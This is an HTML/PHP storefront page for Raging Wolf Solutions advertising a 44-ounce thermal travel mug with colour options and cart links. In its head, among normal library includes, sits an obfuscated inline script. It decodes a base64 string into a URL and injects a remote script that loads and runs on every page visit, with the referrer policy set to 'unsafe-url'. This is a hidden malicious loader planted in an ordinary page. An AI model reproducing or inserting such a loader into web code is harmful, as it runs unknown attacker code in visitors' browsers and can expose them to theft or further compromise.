<!doctype html>
<html>

<head>
    <script src="dmxAppConnect/dmxAppConnect.js"></script>
    <meta charset="UTF-8">
    <title>Giving Back | Raging Wolf Solutions</title>

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/stylesheet.css" />
    <script src="js/jquery-3.5.1.slim.min.js"></script>
    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>

    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
    <link rel="icon" href="icons/favicon.ico">
    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
    <script>
        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
    </script>
    <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>

    <link rel="stylesheet" href="css/charity.css" />


    <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/dmxSlideshow.css" />
    <script src="dmxAppConnect/dmxSlideshow/dmxSlideshow.js" defer></script>
    <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/themes/default.css" />
</head>

<body is="dmx-app" id="index" class="bg-dark">
    <div is="dmx-browser" id="browser1"></div>

    <?php include 'navbar_mini'; ?>

    <?php include 'navbar_main'; ?>



    <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3" style="min-height: 75vh;">

        <img src="assets/images/section-modal-bg-top-stone.png" class="w-100">
        <div class="container">

            <div class="row justify-content-center">
                <div class="col-md-12">
                    <div class="row h-100">

                        <div class="module-card col border rounded-0 rounded-1 border-secondary mt-3 mb-3 ms-3 me-3 pt-3 pb-5 ps-3 pe-3">
                            <div class="container pt-3 pb-2 ps-0 pe-0">
                                <div class="row justify-content-center g-0 gx-4">
                                    <div class="col-lg-5" dmx-hide="mug_color_opt.value">

                                    </div>

                                    <div class="col-lg-5" dmx-show="mug_color_opt.value">
                                        <img src="assets/images/Wolfs_Den_Products/black.webp" class="img-fluid" dmx-show="mug_color_opt.value=='black'">
                                        <img src="assets/images/Wolfs_Den_Products/dk_blue.webp" class="img-fluid" dmx-show="mug_color_opt.value=='dk_blue'">
                                        <img src="assets/images/Wolfs_Den_Products/red.webp" class="img-fluid" dmx-show="mug_color_opt.value=='red'">
                                        <img src="assets/images/Wolfs_Den_Products/teal.webp" class="img-fluid" dmx-show="mug_color_opt.value=='teal'">
                                        <img src="assets/images/Wolfs_Den_Products/white.webp" class="img-fluid" dmx-show="mug_color_opt.value=='white'">

                                    </div>

                                    <div class="col-lg-6 align-self-center pt-2 pb-2">
                                        <h4 class="text-light mb-0"><span class="badge bg-secondary rounded-pill">New!</span>
                                            Large 44z Thermal Travel Mug</h4>

                                        <p class="fw-bold text-danger mb-2">——</p>

                                        <h6>
                                            <span class="badge rounded-pill bg-dark" id="black" dmx-on:click="mug_color_opt.setValue('black')">Black</span>
                                            <span class="badge rounded-pill bg-primary" id="dk_blue" dmx-on:click="mug_color_opt.setValue('dk_blue')">Dark Blue</span>
                                            <span class="badge rounded-pill bg-danger" id="red" dmx-on:click="mug_color_opt.setValue('red')">Red</span>
                                            <span class="badge rounded-pill bg-info" id="teal" dmx-on:click="mug_color_opt.setValue('teal')">Teal</span>
                                            <span class="badge rounded-pill bg-light" style="color: black;" id="white" dmx-on:click="mug_color_opt.setValue('white')">White</span>
                                        </h6>
                                        <p class="fw-bold text-danger mb-2">——</p>
                                        <p class="text-light">Whether you are in the office or on the go, this giant 44-ounce thermal drink mug will keep your favorite beverage at the perfect temprature for hours!</p><a href="wolfsden-checkout.php"><button id="Get_Yours" class="btn text-warning module-cta-btn text-start btn-lg mt-1 mb-1 ps-0 pe-0">Add to cart&nbsp;&nbsp;<i class="fas fa-caret-right"></i></button>

                                        </a>
                                        <p class="text-danger mb-2 fw-bold w-25">——</p>
                                        <a href="wolfsden-checkout.php" id="wolfsdencheckout"><button id="viewCart" class="btn text-warning module-cta-btn btn-lg text-start ps-0 pe-0" dmx-on:click="browser1.goto('wolfsden-checkout.php')">view cart&nbsp;&nbsp;<i class="fas fa-caret-right"></i></button></a>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>




                </div>
            </div>
        </div>

        <div class="row">

            <div class="col text-light">
                <hr>
            </div>
        </div>




    </section>

    <?php include 'footer.php'; ?>

    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>

    <script src="js/script.js"></script>


</body>

</html>